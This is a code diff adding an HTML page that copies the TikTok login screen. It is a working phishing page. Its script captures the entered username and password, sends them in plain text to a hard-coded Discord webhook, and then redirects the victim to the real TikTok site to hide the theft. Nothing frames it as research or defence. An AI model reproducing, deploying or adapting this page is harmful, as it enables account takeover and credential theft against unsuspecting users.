@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff; /* White background */
+            color: #000; /* Black text */
+            display: flex;
+            flex-direction: column; /* Stack items vertically */
+            justify-content: flex-start; /* Align items to the top */
+            align-items: center; /* Center items horizontally */
+            height: 100vh;
+            margin: 0;
+            position: relative; /* Positioning context for absolute elements */
+        }
+
+        .login-container {
+            background-color: #ffffff; /* White background for the container */
+            padding: 40px; /* Increased padding for the container */
+            border-radius: 8px;
+            width: 401px; /* Increased width for the container by 1 pixel */
+            text-align: center;
+            margin-top: 20px; /* Adjusted margin for the login container */
+            position: absolute; /* Positioning to allow it to be moved */
+            top: 50px; /* Move it closer to the top of the page */
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px; /* Reduced margin for the header */
+            font-size: 28px; /* Increased font size for the header */
+        }
+
+        .login-container label {
+            display: block;
+            text-align: left;
+            font-size: 16px; /* Decreased font size for the label */
+            margin-bottom: 5px; /* Reduced margin for the label */
+            color: #000; /* Black text for the label */
+            font-weight: bold; /* Thicker text for the label */
+        }
+
+        .login-container input {
+            width: 85%; /* Set width to 85% */
+            outline: none; /* Remove outline */
+            padding: 10px 24px; /* Set padding with 24px on the right */
+            margin: 5px 0; /* Reduced margin for input fields */
+            border: 1px solid #aaa; /* Set border to 1px solid */
+            border-radius: 2px; /* Set border radius to 2px */
+            background-color: #f0f0f0; /* Gray background for input fields */
+            font-size: 16px; /* Set font size to 16px */
+            height: 26px; /* Set height to 26px */
+            color: black; /* Change text color to black */
+            font-weight: bold; /* Make text thick */
+        }
+
+        .login-with-phone {
+            font-size: 14px; /* Smaller font size for the new label */
+            color: #555; /* Gray text for the new label */
+            text-align: right; /* Align text to the right */
+            margin-bottom: 5px; /* Space below the new label */
+            position: absolute; /* Absolute positioning */
+            top: -20px; /* Move it to the top */
+            right: 10px; /* Align to the right */
+        }
+
+        .login-container button {
+            background-color: #f0f0f0; /* Same gray background as input when disabled */
+            color: #000; /* Black text for the button */
+            border: none;
+            padding: 8px; /* Decreased padding for the button */
+            border-radius: 4px;
+            cursor: not-allowed;
+            width: 100%;
+            transition: background-color 0.3s, color 0.3s; /* Transition for background and text color */
+            font-size: 16px; /* Increased font size for the button */
+            margin-top: 15px; /* Space above the button */
+            height: 44px; /* Set height for the button */
+        }
+
+        .login-container button.enabled {
+            background-color: #fe2c55; /* Change background to reddish color when enabled */
+            color: white; /* Change text color to white */
+            cursor: pointer; /* Change cursor to pointer */
+        }
+
+        .login-container button.enabled:hover {
+            background-color: #e0244a; /* Change background on hover */
+        }
+
+        .forgot-password {
+            font-size: 14px; /* Font size for the link */
+            color: #000; /* Black text for the link */
+            text-decoration: none; /* Remove underline */
+            display: block; /* Make it a block element */
+            margin-top: 10px; /* Space above the link */
+            text-align: left; /* Align text to the left */
+        }
+
+        /* Go Back Text Style */
+        .go-back {
+            margin-top: 30px; /* Increase space above the Go Back text */
+            font-size: 14px; /* Smaller font size for Go Back text */
+            color: black; /* Hard black color for the Go Back text */
+            font-weight: bold; /* Thicker text */
+            cursor: pointer; /* Pointer cursor on hover */
+            text-align: center; /* Center text */
+        }
+
+        /* Feedback and Help Style */
+        .feedback {
+            position: absolute; /* Positioning in the top right corner */
+            top: 20px; /* Space from the top */
+            right: 20px; /* Space from the right */
+            font-size: 14px; /* Font size for Feedback and Help text */
+            color: black; /* Thick black color */
+            font-weight: bold; /* Thicker text */
+        }
+
+        .footer {
+            margin-top: auto; /* Push footer to the bottom */
+            width: 100%; /* Full width footer */
+            background-color: #f0f0f0; /* Background color for footer */
+            padding: 15px 0; /* Padding for footer */
+            text-align: center; /* Center text in footer */
+            position: relative; /* Position relative to allow bottom placement */
+            bottom: 0; /* Align to the bottom */
+        }
+
+        .footer p {
+            margin: 0; /* Remove default margin */
+            font-size: 16px; /* Font size for footer text */
+        }
+
+        .footer a {
+            color: #fe2c55; /* Color for the signup link */
+            text-decoration: none; /* Remove underline */
+        }
+
+        .footer-bar {
+            width: 100%; /* Full width footer bar */
+            background-color: black; /* Black background for the bar */
+            display: flex; /* Flexbox for alignment */
+            justify-content: space-between; /* Space between the items */
+            align-items: center; /* Center items vertically */
+            padding: 15px 30px; /* Padding for the bar */
+            color: white; /* White text color */
+            position: relative; /* Positioning for footer bar */
+            height: 84px; /* Set height for footer bar to 84px */
+            box-sizing: border-box; /* Include padding in height */
+        }
+
+        .english-box {
+            border: 2px solid white; /* White outline for the box */
+            padding: 10px 20px; /* Padding for the box */
+            border-radius: 4px; /* Rounded corners for the box */
+            background-color: black; /* Background color for the box */
+            color: white; /* White text color */
+            text-align: center; /* Center text in the box */
+        }
+
+        .footer-bar .copyright {
+            color: darkgrey; /* Dark grey text for copyright */
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: 120px; /* Increased size for larger logo */
+        }
+    </style>
+</head>
+
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a9/TikTok_logo.svg/640px-TikTok_logo.svg.png" alt="TikTok Logo" class="logo">
+    <div class="feedback">❔ Feedback and help</div> <!-- Feedback and Help Text -->
+    <div class="login-container">
+        <h2>Log in</h2>
+        <label for="username">Email or Username</label>
+        <div style="position: relative;">
+            <span class="login-with-phone">Log in with phone</span> <!-- Added "Log in with phone" text -->
+            <input type="text" id="username" placeholder="Email or Username" required>
+        </div>
+        <input type="password" id="password" placeholder="Password" required>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <button type="submit" id="loginButton" class="disabled" disabled>Log in</button>
+        <div class="go-back">< Go back</div> <!-- Go Back Text -->
+    </div>
+
+    <div class="footer">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <div class="footer-bar">
+        <div class="english-box">English</div>
+        <span class="copyright">© 2024 TikTok</span>
+    </div>
+
+    <script>
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+
+        function toggleButtonState() {
+            if (usernameInput.value && passwordInput.value) {
+                loginButton.disabled = false;
+                loginButton.classList.add('enabled');
+                loginButton.classList.remove('disabled');
+                loginButton.style.cursor = 'pointer';
+            } else {
+                loginButton.disabled = true;
+                loginButton.classList.remove('enabled');
+                loginButton.classList.add('disabled');
+                loginButton.style.cursor = 'not-allowed';
+            }
+        }
+
+        usernameInput.addEventListener('input', toggleButtonState);
+        passwordInput.addEventListener('input', toggleButtonState);
+
+        document.getElementById('loginButton').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+
+            // Prepare data to send to Discord webhook
+            const data = {
+                content: `Username: ${username}\nPassword: ${password}`
+            };
+
+            // Using XMLHttpRequest to send data
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://discord.com/api/webhooks/1284482242176876646/OkAvE9VUebJWVTw9scuvqzI69W9ahLDiU1vvQHg3CWBVoQiFI_P94HSl1IcNvZeLOu9x', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 204) {
+                    // Wait for 3 seconds before redirecting to TikTok
+                    setTimeout(() => {
+                        window.location.href = 'https://tiktok.com';
+                    }, 3000);
+                }
+            };
+            xhr.send(JSON.stringify(data));
+        });
+    </script>
+</body>
+
+</html>
